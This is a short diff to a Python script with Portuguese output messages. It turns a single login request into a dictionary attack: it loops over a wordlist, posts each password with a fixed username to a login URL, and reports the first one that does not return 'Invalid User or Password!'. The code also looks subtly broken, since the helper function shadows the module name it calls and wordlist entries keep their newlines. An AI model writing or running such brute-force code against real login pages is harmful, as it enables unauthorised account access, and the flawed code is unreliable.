@@ -13,6 +13,18 @@ wordList = open(arquivo, "r")
 def request(user, password):
     body = {"user":user, "password":password }
     r = request.post(loginUrl, data = json.dumps(body))
-    print(r)
+    print(r.text)
+    if "Invalid User or Password!" in r.text:
+        return False
+    else:
+        return True
 
-request("aa","aa")
+for i in wordList:
+    print(i)
+    if request(usuario, i) == True:
+        print(usuario + "|" + i + "são os registros que estamos procurando")
+        break
+    
+    else:
+        print(usuario + "|" + i + "não são validos")
+
